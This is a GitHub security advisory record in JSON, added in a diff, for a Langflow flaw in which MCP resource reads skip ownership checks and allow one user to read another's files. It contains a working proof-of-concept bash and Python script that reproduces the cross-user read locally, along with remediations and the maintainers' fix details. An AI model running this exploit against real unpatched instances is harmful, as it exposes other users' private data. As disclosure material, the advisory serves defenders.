@@ -1,0 +1,88 @@
+{
+  "id": "GHSA-4hmc-cfm3-w43c",
+  "modified": "2026-10-07T20:45:06.755038392Z",
+  "published": "2026-10-07T20:35:12Z",
+  "aliases": [
+    "CVE-2026-105699"
+  ],
+  "summary": "Langflow has Authenticated Cross-Project File Disclosure via Unscoped MCP Resource Handlers",
+  "details": "### Summary\nLangflow's project-scoped MCP transport authenticates the caller for the `project_id` in the connection URL, but the subsequent `resources/read` operation does not authorize the resource URI being requested. An authenticated user can connect to their own project-scoped MCP endpoint and supply a crafted file-download URI that points to another user's flow-backed file. The server then reads and returns the victim file without verifying ownership or project membership.\n\nThis is a cross-user authorization bypass (`userA -\u003e userB`) that allows arbitrary read access to files stored under other users' flow namespaces.\n\n### Details\nVerified against local checkout:\n\n- Repository: `langflow-ai/langflow`\n- Verified on release tag: `v1.8.3`\n- Commit: `08bf98404cfd7737fde57a2588785766cdf1b42e`\n- Earliest stable release known to contain the vulnerable code path: `v1.6.8`\n\nRelevant code path:\n\n1. `src/backend/base/langflow/api/v1/mcp_projects.py:147-193`\n   `verify_project_auth_conditional()` authenticates the caller and checks access only to the `project_id` in the MCP transport URL.\n\n2. `src/backend/base/langflow/api/v1/mcp_projects.py:1238-1241`\n   The project-scoped MCP server registers `read_resource()` and forwards the attacker-controlled URI directly to `handle_read_resource(uri=uri)`.\n\n3. `src/backend/base/langflow/api/v1/mcp_utils.py:163-182`\n   `handle_read_resource()` parses the last two URI path segments as `flow_id` and `filename`, then directly calls:\n\n   ```python\n   storage_service.get_file(flow_id=flow_id, file_name=filename)\n   ```\n\n   No check ties the supplied `flow_id` back to the authenticated user or the current project.\n\n4. `src/backend/base/langflow/services/storage/local.py:141-149`\n   `src/backend/base/langflow/services/storage/s3.py:200-217`\n   The storage layer performs a raw namespace read and is not authorization-aware.\n\nThe result is that authorization is enforced at MCP connection time, but not at resource-read time. Once an attacker has access to any project-scoped MCP endpoint they own, they can read another user's flow-backed file by passing a victim-controlled URI.\n\nThis issue is also easier to exploit because the global MCP helpers expose cross-user discovery data:\n\n- `src/backend/base/langflow/api/v1/mcp_utils.py:102-121`\n  `handle_list_resources(project_id=None)` lists files for all flows.\n- `src/backend/base/langflow/api/v1/mcp_utils.py:333-380`\n  `handle_list_tools(project_id=None)` queries all flows and includes flow IDs in tool metadata.\n\nThat global enumeration is not required for exploitation, but it makes obtaining victim identifiers much easier.\n\n### PoC\nPreconditions:\n\n- Langflow is running locally with authentication enabled.\n- Two separate users exist on the same instance.\n- The victim has a flow with an uploaded file.\n- The attacker has access to any project they own.\n\nVerify the issue locally by starting Langflow with:\n\n```bash\ncd '/Users/r1zzg0d/Documents/CVE hunting/targets/langflow'\n\nset -a\nsource .env.verify\nset +a\n\nexport LANGFLOW_CONFIG_DIR=\"$PWD/.langflow-verify\"\n\nuv run python - \u003c\u003c'PY'\nfrom langflow.main import setup_app\nimport uvicorn\n\napp = setup_app(backend_only=True)\nuvicorn.run(app, host=\"127.0.0.1\", port=7860, log_level=\"debug\")\nPY\n```\n\nThen, in a second terminal, the following script creates a victim user, an attacker user, a victim flow-backed file, and demonstrates that:\n\n- the normal file download route is blocked for the attacker (`404`)\n- the same file is readable through the attacker's own project-scoped MCP connection\n\n```bash\ncd '/Users/r1zzg0d/Documents/CVE hunting/targets/langflow'\nset -euo pipefail\n\nexport BASE='http://127.0.0.1:7860'\nexport PASS='Passw0rd!Passw0rd!'\nexport VICTIM_USER=\"victim.$RANDOM@example.com\"\nexport ATTACKER_USER=\"attacker.$RANDOM@example.com\"\n\ncurl -sS -X POST \"$BASE/api/v1/users/\" \\\n  -H 'Content-Type: application/json' \\\n  -d \"{\\\"username\\\":\\\"$VICTIM_USER\\\",\\\"password\\\":\\\"$PASS\\\"}\" \u003e/dev/null\n\ncurl -sS -X POST \"$BASE/api/v1/users/\" \\\n  -H 'Content-Type: application/json' \\\n  -d \"{\\\"username\\\":\\\"$ATTACKER_USER\\\",\\\"password\\\":\\\"$PASS\\\"}\" \u003e/dev/null\n\nexport VICTIM_TOKEN=$(\n  curl -sS -X POST \"$BASE/api/v1/login\" \\\n    -H 'Content-Type: application/x-www-form-urlencoded' \\\n    --data-urlencode \"username=$VICTIM_USER\" \\\n    --data-urlencode \"password=$PASS\" | jq -r '.access_token'\n)\n\nexport ATTACKER_TOKEN=$(\n  curl -sS -X POST \"$BASE/api/v1/login\" \\\n    -H 'Content-Type: application/x-www-form-urlencoded' \\\n    --data-urlencode \"username=$ATTACKER_USER\" \\\n    --data-urlencode \"password=$PASS\" | jq -r '.access_token'\n)\n\nexport VICTIM_PROJECT_ID=$(\n  curl -sS -X POST \"$BASE/api/v1/projects/\" \\\n    -H \"Authorization: Bearer $VICTIM_TOKEN\" \\\n    -H 'Content-Type: application/json' \\\n    -d '{\"name\":\"victim-project\"}' | jq -r '.id'\n)\n\nexport ATTACKER_PROJECT_ID=$(\n  curl -sS -X POST \"$BASE/api/v1/projects/\" \\\n    -H \"Authorization: Bearer $ATTACKER_TOKEN\" \\\n    -H 'Content-Type: application/json' \\\n    -d '{\"name\":\"attacker-project\"}' | jq -r '.id'\n)\n\nexport VICTIM_FLOW_ID=$(\n  curl -sS -X POST \"$BASE/api/v1/flows/\" \\\n    -H \"Authorization: Bearer $VICTIM_TOKEN\" \\\n    -H 'Content-Type: application/json' \\\n    -d \"{\\\"name\\\":\\\"victim-flow\\\",\\\"data\\\":{\\\"nodes\\\":[],\\\"edges\\\":[]},\\\"folder_id\\\":\\\"$VICTIM_PROJECT_ID\\\"}\" \\\n    | jq -r '.id'\n)\n\nprintf 'cross-project-read-proof\\n' \u003e /tmp/secret.txt\n\nexport UPLOAD_JSON=$(\n  curl -sS -X POST \"$BASE/api/v1/files/upload/$VICTIM_FLOW_ID\" \\\n    -H \"Authorization: Bearer $VICTIM_TOKEN\" \\\n    -F \"file=@/tmp/secret.txt\"\n)\n\nexport VICTIM_FILE=$(\n  printf '%s' \"$UPLOAD_JSON\" | jq -r '.file_path | split(\"/\") | last'\n)\n\nexport VICTIM_URI=\"$BASE/api/v1/files/download/$VICTIM_FLOW_ID/$VICTIM_FILE\"\n\nexport ATTACKER_API_KEY=$(\n  curl -sS -X POST \"$BASE/api/v1/api_key/\" \\\n    -H \"Authorization: Bearer $ATTACKER_TOKEN\" \\\n    -H 'Content-Type: application/json' \\\n    -d '{\"name\":\"attacker-mcp-key\"}' | jq -r '.api_key'\n)\n\nexport DIRECT_STATUS=$(\n  curl -sS -o /dev/null -w '%{http_code}' \\\n    -H \"Authorization: Bearer $ATTACKER_TOKEN\" \\\n    \"$VICTIM_URI\"\n)\n\nexport MCP_READ_OUTPUT=$(\nuv run python - \u003c\u003c'PY'\nimport asyncio\nimport base64\nimport os\n\nimport httpx\nfrom mcp import ClientSession\nfrom mcp.client.streamable_http import streamable_http_client\n\nbase = os.environ[\"BASE\"]\nproject_id = os.environ[\"ATTACKER_PROJECT_ID\"]\napi_key = os.environ[\"ATTACKER_API_KEY\"]\nvictim_uri = os.environ[\"VICTIM_URI\"]\nurl = f\"{base}/api/v1/mcp/project/{project_id}/streamable\"\n\nasync def main():\n    async with httpx.AsyncClient(headers={\"x-api-key\": api_key}, timeout=30.0) as client:\n        async with streamable_http_client(url, http_client=client) as (read_stream, write_stream, _):\n            async with ClientSession(read_stream, write_stream) as session:\n                await session.initialize()\n                result = await session.read_resource(victim_uri)\n                blob = result.contents[0].blob\n                print(base64.b64decode(base64.b64decode(blob)).decode().strip())\n\nasyncio.run(main())\nPY\n)\n\necho \"Direct /files/download as attacker -\u003e $DIRECT_STATUS\"\necho \"Project-scoped MCP resources/read -\u003e $MCP_READ_OUTPUT\"\n```\n\nExpected output:\n\n```text\nDirect /files/download as attacker -\u003e 404\nProject-scoped MCP resources/read -\u003e cross-project-read-proof\n```\n\nObserved server logs during verification:\n\n```text\nGET /api/v1/files/download/... 404 Not Found\nPOST /api/v1/mcp/project/\u003cattacker-project-id\u003e/streamable 200 OK\nPOST /api/v1/mcp/project/\u003cattacker-project-id\u003e/streamable 202 Accepted\nPOST /api/v1/mcp/project/\u003cattacker-project-id\u003e/streamable 200 OK\n```\n\n### Impact\nThis is an authenticated IDOR / arbitrary file read issue in the MCP layer.\n\nAny authenticated Langflow user who can access at least one project-scoped MCP endpoint can read files belonging to other users by supplying a victim file URI to `resources/read`.\n\nPractical impact includes:\n\n- Cross-user disclosure of uploaded documents, CSV files, JSON files, prompts, and other flow-backed artifacts\n- Unauthorized access to sensitive business data stored in flow namespaces\n- Easier exploitation when global MCP helpers reveal other users' flow IDs and file names\n\n### Suggested Remediations\n1. Authorize `resources/read` against the authenticated context before calling storage.\n   Resolve `flow_id` to a database object and require both:\n   `flow.user_id == current_user.id`\n   and, for project-scoped transports, `flow.folder_id == current_project_id`.\n\n2. Stop trusting arbitrary file-download URIs as resource identifiers.\n   Instead, return opaque server-generated resource IDs from `resources/list` and resolve them server-side to an already authorized object.\n\n3. Scope global MCP enumeration helpers to the authenticated user.\n   `handle_list_resources()` and `handle_list_tools()` should not query all flows when `project_id=None`; they should return only flows owned by the current user, or require elevated privileges for broader discovery.\n\n\n\n### Fix Status (Maintainer Triage Update — 2026-09-22)\n\nThis report is accurate. The vulnerable code path described above (missing\nownership check in `handle_read_resource()`) has since been fixed.\n\n**Corrected affected version range:** `\u003e= 1.6.8, \u003c= 1.9.0` (not `\u003c= 1.8.3` —\nconfirmed still vulnerable through `v1.9.0`; the fix landed with the `v1.9.1`\nrelease, not later).\n\n**Fixed in:** `v1.9.1` (GitHub Release published 2026-04-24), via PR\n[#12818 — \"fix(mcp): close path traversal + cross-user disclosure (PVR0754098)\"](https://github.com/langflow-ai/langflow/pull/12818).\n- Backport commit on `release-1.9.1`: `f0fd436fe9829192ee550e6cb46961a01dd37032`\n- Corresponding commit on `main`: `b8fe970493fd5fb2e1fc71dfccc79f90b76058fa`\n\nThe fix:\n- `handle_read_resource()` now requires an authenticated user context and\n  resolves the namespace segment of the URI to a `Flow` row scoped to\n  `Flow.user_id == current_user.id`, additionally filtering on\n  `Flow.folder_id == project_id` for project-scoped MCP servers\n  (`src/backend/base/langflow/api/v1/mcp_utils.py`).\n- Rejects filenames containing `..`, `/`, or `\\` as defense-in-depth against\n  path traversal, and applies the same containment check to the storage\n  layer's `get_file`/`get_file_stream`/`delete_file`/`get_file_size`\n  (`local.py`/`s3.py`, both in `langflow` and `lfx`).\n- `handle_list_resources()` / `handle_list_tools()` are now scoped to\n  `current_user.id` on the global (non-project) MCP server, closing the\n  cross-user enumeration this report also flagged.\n\nVerified independently against `langflow-ai/langflow` @ `89444c3bb5`\n(release-1.11.0 branch, current as of 2026-09-22): the fix is present, and\nthe regression suite (`src/backend/tests/unit/api/v1/test_mcp_utils.py`,\n21/21 passing) includes `test_handle_read_resource_denies_other_users_flow`,\nwhich reproduces this report's exact cross-user scenario and asserts it now\nraises `ValueError(\"... access denied\")`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "langflow",
+        "purl": "pkg:pypi/langflow"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "1.6.8"
+            },
+            {
+              "fixed": "1.9.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.6.8",
+        "1.6.9",
+        "1.7.0",
+        "1.7.1",
+        "1.7.2",
+        "1.7.3",
+        "1.8.0",
+        "1.8.0rc0",
+        "1.8.0rc1",
+        "1.8.0rc2",
+        "1.8.0rc3",
+        "1.8.0rc4",
+        "1.8.0rc5",
+        "1.8.0rc6",
+        "1.8.1",
+        "1.8.2",
+        "1.8.3",
+        "1.8.3rc0",
+        "1.8.4",
+        "1.9.0"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.9.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-4hmc-cfm3-w43c/GHSA-4hmc-cfm3-w43c.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/langflow-ai/langflow/security/advisories/GHSA-4hmc-cfm3-w43c"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-105699"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/langflow-ai/langflow/pull/12818"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/langflow-ai/langflow/commit/b8fe970493fd5fb2e1fc71dfccc79f90b76058fa"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/langflow-ai/langflow/commit/f0fd436fe9829192ee550e6cb46961a01dd37032"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/langflow-ai/langflow"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/langflow-ai/langflow/releases/tag/v1.9.1"
+    }
+  ]
+}
